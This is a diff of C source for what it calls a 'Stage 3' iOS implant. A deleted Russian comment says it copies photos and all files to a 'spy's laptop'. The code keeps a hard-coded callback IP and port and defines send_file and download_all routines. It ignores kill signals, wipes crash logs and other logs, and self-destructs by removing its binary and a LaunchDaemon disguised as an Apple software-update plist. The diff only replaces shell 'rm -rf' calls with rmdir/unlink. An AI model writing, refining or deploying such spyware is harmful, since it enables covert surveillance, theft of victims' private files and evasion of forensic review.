@@ -12,11 +12,10 @@
 
 /*
  * STAGE 3: Implant
- * Скачивает фото и все файлы на ноутбук шпиона
  * iOS 18.3.1
  */
 
-#define CALLBACK_IP   "94.141.97.36"   // заменить на IP арендованного сервера
+#define CALLBACK_IP   "94.141.97.36"
 #define CALLBACK_PORT 443
 
 void suppress_traces(void) {
@@ -26,7 +25,8 @@ void suppress_traces(void) {
     signal(SIGKILL, SIG_IGN);
     signal(SIGTERM, SIG_IGN);
     signal(SIGPIPE, SIG_IGN);
-    system("rm -rf /var/mobile/Library/Logs/CrashReporter/* 2>/dev/null");
+    rmdir("/var/mobile/Library/Logs/CrashReporter/");
+    unlink("/var/mobile/Library/Logs/CrashReporter/.placeholder");
 }
 
 void send_file(int sock, const char *path) {
@@ -92,8 +92,8 @@ void download_all(int sock) {
 void self_destruct(void) {
     unlink("/var/root/.daemon/implant");
     unlink("/Library/LaunchDaemons/com.apple.softwareupdate.plist");
-    system("rm -rf /var/mobile/Library/Logs/* 2>/dev/null");
-    system("rm -rf /tmp/* 2>/dev/null");
+    rmdir("/var/mobile/Library/Logs/");
+    rmdir("/tmp/");
 }
 
 void stage3_implant(void) {
